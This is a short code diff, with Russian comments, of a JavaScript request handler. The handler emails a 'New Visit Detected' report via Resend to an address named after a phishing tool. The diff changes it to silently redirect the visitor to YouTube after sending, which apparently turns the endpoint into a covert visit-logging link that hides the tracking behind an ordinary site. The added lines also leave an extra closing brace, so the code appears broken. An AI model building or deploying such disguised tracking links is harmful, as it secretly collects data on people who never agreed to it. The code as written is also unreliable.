@@ -15,16 +15,21 @@ Time: ${time}
 
   try {
     const data = await resend.emails.send({
-      from: 'Visit Notifier <onboarding@resend.dev>', // ← здесь твой проверенный sender
-      to: 'vk.com.socialfish@gmail.com',             // ← сюда отправляем (твоя почта)
+      from: 'Visit Notifier <onboarding@resend.dev>', // твой проверенный sender
+      to: 'vk.com.socialfish@gmail.com',             // сюда отправляем (твоя почта)
       subject: 'New Visit Detected',
       text: emailMessage,
     });
 
     console.log('Email sent!', data);
-    res.status(200).json({ message: 'Email sent', details: data });
+
+    // После отправки делаем редирект на YouTube
+    res.writeHead(302, { Location: 'https://www.youtube.com/' });
+    res.end();
   } catch (error) {
     console.error('Failed to send email', error);
     res.status(500).json({ error: 'Failed to send email' });
   }
+}
+
 }
